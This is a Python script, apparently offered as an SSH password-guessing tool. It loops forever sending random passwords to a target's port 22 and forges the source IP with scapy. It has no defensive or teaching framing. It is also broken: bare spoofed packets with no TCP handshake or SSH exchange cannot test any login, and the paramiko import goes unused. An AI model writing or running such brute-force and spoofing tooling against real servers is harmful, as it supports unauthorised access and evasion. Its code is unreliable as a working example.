import paramiko
import random
import string
import time
from scapy.all import *

def generate_random_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for i in range(length))

def send_ssh_packet(destination, source, username, password):
    packet = IP(src=source, dst=destination)/TCP(dport=22)/Raw(load=f"{username}\r\n{password}\r\n")
    send(packet, verbose=0)

def get_user_input():
    hostname = input("Enter the hostname or IP address of the SSH server: ")
    username = input("Enter the username: ")
    source_ip = input("Enter the source IP address: ")
    return hostname, username, source_ip

if __name__ == "__main__":
    hostname, username, source_ip = get_user_input()

    while True:
        password = generate_random_password()
        try:
            send_ssh_packet(hostname, source_ip, username, password)
            print(f"SSH packet sent with source IP {source_ip} and password: {password}")
        except Exception as e:
            print(f"Failed to send SSH packet with password: {password}, Error: {e}")
        
        time.sleep(1)  # Adjust sleep time as needed to control the rate of connection attempts
